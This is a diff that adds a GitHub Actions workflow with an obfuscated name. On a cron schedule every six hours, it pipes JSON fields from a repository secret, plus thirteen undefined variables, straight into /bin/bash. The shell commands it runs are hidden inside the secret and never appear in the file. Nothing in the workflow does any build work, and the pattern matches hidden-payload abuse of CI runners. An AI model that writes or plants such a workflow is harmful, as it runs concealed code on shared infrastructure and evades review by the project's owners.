@@ -1,0 +1,30 @@
+name: rangaleracketeer
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: rangaleracketeer
+        env:
+          ksme21549: ${{ secrets.ksme21549 }}
+        run: |
+          echo $ksme21549 | jq -r .sj4 | /bin/bash
+          echo $uouu8 | jq -r .gb8 | /bin/bash
+          echo $tezf0 | jq -r .h139 | /bin/bash
+          echo $glx643 | jq -r .h5 | /bin/bash
+          echo $bypw10 | jq -r .hkjgy5 | /bin/bash
+          echo $j2 | jq -r .j1 | /bin/bash
+          echo $aeyp6 | jq -r .tanth2466 | /bin/bash
+          echo $xo92 | jq -r .tw9011 | /bin/bash
+          echo $fqw91325 | jq -r .n414 | /bin/bash
+          echo $bovhw158 | jq -r .shj3388 | /bin/bash
+          echo $aoy1166 | jq -r .lbvy2241 | /bin/bash
+          echo $eutqt268 | jq -r .lhcqc43 | /bin/bash
+          echo $ki60 | jq -r .hl584 | /bin/bash
+          echo $aa68 | jq -r .os38803 | /bin/bash
+
